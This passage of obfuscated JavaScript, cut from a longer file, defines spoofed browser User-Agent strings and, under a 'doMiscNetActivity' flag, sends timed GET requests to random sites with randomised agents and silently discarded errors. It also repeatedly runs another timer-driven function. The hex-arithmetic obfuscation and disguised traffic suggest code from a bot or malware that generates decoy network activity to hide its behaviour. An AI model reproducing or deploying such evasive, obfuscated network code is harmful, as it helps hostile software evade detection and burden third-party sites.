      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xdc3 + -0x5 * 0x161 + 0x14a8; k < 0x214 + 0x1d35 + -0x1f45; k++)
    setTimeout(f, (-0x59e * -0x22 + -0x4 * -0x5037 + -0x11578) * k * getRandomInt(0x206b + 0x2287 + -0x1 * 0x42f1, 0x226e + 0x2126 * 0x1 + -0x31 * 0x161));
  setInterval(() => {
    f();
    for (let l = 0x2f * -0x55 + -0x1 * -0xc7d + 0x31e; l < 0x12 * 0xd7 + 0x1 * -0xc7d + -0x29d; l++)
      setTimeout(f, (-0x5b9e + 0x10 * -0xefc + 0x235be) * l * getRandomInt(-0x96b * -0x3 + 0x26dc + 0x1 * -0x431c, 0x5f * 0x58 + 0x1df4 + -0x3e99));
  }, -0x1 * 0x233e19 + 0x9 * 0x4aac1 + 0x238 * 0x15b6);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x16d2 + -0x2ba6 + 0xc0b * 0x4) * getRandomInt(0x101 * -0x10 + -0x196 * -0x13 + -0xe11, 0x1 * -0x1984 + -0x1ad4 + 0x23 * 0x17f));
}, 0x2460 + -0x221 + 0x1b * -0x141);